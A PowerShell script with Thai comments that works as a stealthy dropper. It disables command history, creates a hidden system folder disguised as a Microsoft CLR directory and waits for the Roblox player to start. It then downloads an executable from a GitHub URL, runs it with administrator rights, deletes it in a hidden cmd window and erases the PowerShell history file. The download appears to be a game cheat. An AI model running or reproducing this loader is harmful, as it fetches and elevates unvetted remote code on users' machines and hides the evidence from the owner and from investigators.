# 1. จัดการเรื่องประวัติและข้อผิดพลาด (เน้นความเงียบ)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย (สร้างและซ่อนโฟลเดอร์)
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
& attrib +h +s $workDir

# กำหนดเส้นทางไฟล์และโปรเซสเป้าหมาย
$exeOutput = Join-Path $workDir "WinHelper.exe"
$exeUrl = "https://github.com/JOK14er/dawdawdawdwadawdawd/raw/refs/heads/main/TataExternal.exe"
$targetProcess = "RobloxPlayerBeta"

# [เพิ่มเติม] รอจนกว่าจะตรวจพบโปรเซส RobloxPlayerBeta  จึงจะไปขั้นตอนต่อไป
while (-not (Get-Process -Name $targetProcess -ErrorAction SilentlyContinue)) {
    Start-Sleep -Seconds 2
}

# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลดไฟล์ใหม่
if (Test-Path $exeOutput) { Remove-Item $exeOutput -Force }

# ดาวน์โหลด TataExternal.exe
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exeOutput)
} catch {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exeOutput -UseBasicParsing
}

# 4. ตรวจสอบไฟล์แล้วสั่งรันระบบแบบสิทธิ์ Admin
if (Test-Path $exeOutput) {
    try {
        $sh = New-Object -ComObject Shell.Application
        $sh.ShellExecute($exeOutput, "", "", "runas", 1)
        Start-Sleep -Seconds 5  # ขยายเวลารอเป็น 5 วินาทีเพื่อให้มั่นใจว่าโปรแกรมโหลดเข้า Memory ทัน
    } catch {
        Start-Process -FilePath $exeOutput -Verb RunAs
        Start-Sleep -Seconds 5
    }
}

# 5. เปิดระบบบันทึกประวัติกลับมา และสั่ง CMD เก็บกวาดเบื้องหลัง (รอ 15 วินาทีแล้วลบไฟล์ EXE)
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
try {
    $cleanCmd = "timeout /t 15 && del /f /q `"$exeOutput`""
    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
} catch {}

# 6. รันคำสั่งลบประวัติใน PowerShell ทันทีก่อนปิดตัว
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
} catch {}

exit
